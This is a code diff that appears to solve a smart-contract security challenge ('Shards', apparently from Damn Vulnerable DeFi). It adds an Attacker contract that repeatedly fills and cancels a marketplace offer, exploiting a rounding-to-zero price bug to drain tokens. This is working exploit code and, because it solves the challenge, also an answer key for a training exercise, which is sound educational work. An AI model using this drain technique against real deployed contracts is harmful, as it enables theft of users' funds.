@@ -113,8 +113,11 @@ contract ShardsChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_shards() public checkSolvedByPlayer {
-        
+    Attacker attacker;
+
+    function testShardsExploit() public checkSolvedByPlayer {
+        // Deploy the attacker contract, passing the marketplace, recovery address, and token contract
+        attacker = new Attacker(address(marketplace), recovery, address(token));
     }
 
     /**
@@ -134,5 +137,36 @@ contract ShardsChallenge is Test {
 
         // Player must have executed a single transaction
         assertEq(vm.getNonce(player), 1);
+    }
+}
+
+
+contract Attacker {
+    ShardsNFTMarketplace marketplaceContract; // Reference to the ShardsNFTMarketplace
+    DamnValuableToken paymentToken; // Reference to the payment token (DVT)
+
+    /**
+     * @dev Constructor to execute the exploit immediately upon deployment.
+     * @param marketplaceAddress Address of the ShardsNFTMarketplace contract.
+     * @param recoveryAddress Address where the drained funds will be sent.
+     * @param tokenAddress Address of the payment token contract (DamnValuableToken).
+     */
+    constructor(address marketplaceAddress, address recoveryAddress, address tokenAddress) {
+        // Initialize references to marketplace and token contracts
+        marketplaceContract = ShardsNFTMarketplace(marketplaceAddress);
+        paymentToken = DamnValuableToken(tokenAddress);
+        
+        // Exploit loop: Repeatedly fill and cancel an offer to drain marketplace funds
+        for (uint256 i = 0; i < 12200; i++) {
+            // Call `fill` to purchase 100 shards from offer ID 1
+            //no token transfer required due to rounding down to zero fo the required tokens for 100 shards
+            uint256 purchaseIndex = marketplaceContract.fill(1, 100);
+            
+            // Call `cancel` to cancel the purchase and receive a refund
+            marketplaceContract.cancel(1, purchaseIndex);
+        }
+        
+        // Transfer all drained tokens to the recovery address
+        paymentToken.transfer(recoveryAddress, paymentToken.balanceOf(address(this)));
     }
 }
